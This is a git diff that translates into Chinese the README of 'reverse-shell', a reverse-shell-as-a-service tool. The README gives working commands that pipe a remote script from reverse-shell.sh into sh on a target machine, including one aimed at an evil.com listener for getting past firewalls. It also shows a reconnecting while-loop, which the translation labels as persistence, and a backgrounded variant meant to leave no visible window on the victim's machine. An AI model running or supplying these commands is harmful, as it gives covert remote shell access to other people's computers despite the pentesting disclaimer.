@@ -5,9 +5,9 @@
     </a>
 </div>
 
-# reverse-shell
+# 反弹shell
 
-> Reverse Shell as a Service - https://reverse-shell.sh
+> 反弹Shell即服务 - https://reverse-shell.sh
 
 [![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
 [![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)
@@ -15,74 +15,74 @@
 [![Bitcoin Donate](https://badgen.net/badge/Bitcoin/Donate/F19537?icon=bitcoin)](https://lu.ke/tip/bitcoin)
 [![Lightning Donate](https://badgen.net/badge/Lightning/Donate/F6BC41?icon=bitcoin-lightning)](https://lu.ke/tip/lightning)
 
-Easy to remember reverse shell that should work on most Unix-like systems.
+易于记忆的反弹Shell，应该适用于大多数Unix系统。
 
-Detects available software on the target and runs an appropriate payload.
+检测目标上的可用软件并运行适当有效的Payload。
 
-## Usage
+## 用法
 
-### 1. Listen for connection
+### 1. 监听连接
 
-On your machine, open up a port and listen on it. You can do this easily with netcat.
+在你的计算机上，打开一个端口并监听它，你可以使用netcat轻松做到这一点。
 
 ```shell
 nc -l 1337
 ```
-### 2. Execute reverse shell on target
+### 2. 在目标上执行反弹Shell
 
-On the target machine, pipe the output of https://reverse-shell.sh/yourip:port into sh.
+在目标计算机上，将 https://reverse-shell.sh/yourip:port 的输出通过管道符传输到sh。
 
 ```shell
 curl https://reverse-shell.sh/192.168.0.69:1337 | sh
 ```
 
-Go back to your machine, you should now have a shell prompt.
+回到你的机器，你现在应该有一个Shell提示符了。
 
-### 3. Don't be a dick
+### 3. 不要乱搞
 
-This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.
+这旨在用于渗透测试或帮助同事了解为什么他们应该始终锁定计算机。请不要将其用于任何恶意行为。
 
-## Demo
+## 一个小Demo
 
 <img src="https://i.imgur.com/qqjhxAw.gif" width="808">
 
-## Tips
+## 小技巧
 
-### Hostname
+### 主机名
 
-You can use a hostname instead of an IP.
+你可以使用主机名代替IP。
 
 ```shell
 curl https://reverse-shell.sh/localhost:1337 | sh
 ```
 
-### Remote connections
+### 远程连接
 
-Because this is a reverse connection it can punch through firewalls and connect to the internet.
+因为这是一个反弹连接，所以它是可以穿透防火墙并连接到互联网。
 
-You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:
+你可以在 evil.com 上侦听服务器上的连接，并通过以下命令从安全网络内部获取反向 shell：
 
 ```shell
 curl https://reverse-shell.sh/evil.com:1337 | sh
 ```
 
-### Reconnecting
+### 重新连接（权限维持）
 
-By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.
+默认情况下，当 shell 退出时，您将失去连接。您可能会意外地使用无效的命令执行此操作。您可以轻松地创建一个 shell，该 shell 将尝试通过将其包装在 while 循环中来重新连接。
 
 ```shell
 while true; do curl https://reverse-shell.sh/yourip:1337 | sh; done
 ```
 
-Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.
+如果你对同事这样做，要小心，如果他们离开办公室时仍然在运行，你就会让他们受到攻击。
 
-### Running as a background process
+### 作为后台进程运行
 
-The terminal session needs to be kept open to persist the reverse shell connection. That might be a bit of a giveaway if you're trying to prank coworkers.
+终端会话需要保持打开状态才能保持反向 shell 连接。如果你想恶作剧同事，这可能有点暴露了。
 
-The following command will run the reverse shell in a background process and exit the terminal, leaving no suspicious looking terminal windows open on the victim's machine.
+以下命令将在后台进程中运行反向 shell 并退出终端，从而在受害者的计算机上不会打开任何看起来可疑的终端窗口。
 
-Make sure you run this in a fresh terminal window otherwise you'll lose any work in your existing session.
+确保在新的终端窗口中运行此命令，否则您将丢失现有会话中的任何工作。
 
 ```shell
 sh -c "curl https://reverse-shell.sh/localhost:1337 | sh -i &" && exit
